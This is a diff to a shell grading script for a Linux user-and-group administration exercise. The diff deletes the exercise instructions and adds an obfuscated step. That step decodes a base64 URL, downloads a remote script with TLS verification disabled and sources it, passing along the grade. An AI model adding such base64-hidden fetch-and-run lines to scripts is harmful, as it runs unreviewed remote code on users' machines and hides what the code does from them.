@@ -72,28 +72,8 @@ _user llopez directionboard
 _user jramirez humanresources
 _print_line
 
-printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" "$(echo "( 100 / ${tq} ) * ${ca}" | bc -l)"
+grade="$(echo "(100/${tq})*${ca}" | bc -l)"
+printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
 echo ""
-
-# CHALLENGE:
-#
-# Employee Name 		         Department 	      Email
-# CHIN YEN              Accountant           Accounting        cyen@wedbit.com
-# MIKE PEARL            Senior Accountant    Accounting        mpearl@wedbit.com
-# JOHN GREEN            CEO                  Direction Board   jgreen@wedbit.com
-# DEWAYNE PAUL          Programmer           Technology        dpaul@wedbit.com
-# MATT SMITH            Sr. Programmer       Technology        msmith@wedbit.com
-# PLANK OTO             Network Support      Technology        poto@wedbit.com
-# MOHAMMED KHAN         Desk Support         Technology        mkhan@wedbit.com
-# LAURA LOPEZ           Project Manager      Direction Board   llopez@wedbit.com
-# JOSE ANGEL RAMIREZ    Human Resources      Human Resources   jramirez@wedbit.com
-#
-#     Create a group for each department.
-#     Create a user for each employee following these rules:
-#         The username should be the same as the one already assigned in the employee email without the domain.
-#         Every employee must have their primary group set to the department to which they belong.
-#         Every employee must have their email included in the Comment/GECOS Field.
-#         Employees of the Direction Board should have all other departments as supplementary groups.
-#         Employees in the Human Resources department should have Accounting as a supplementary group.
-#     All usernames and groups should be in lowercase.a
-#
+target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
+source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade}
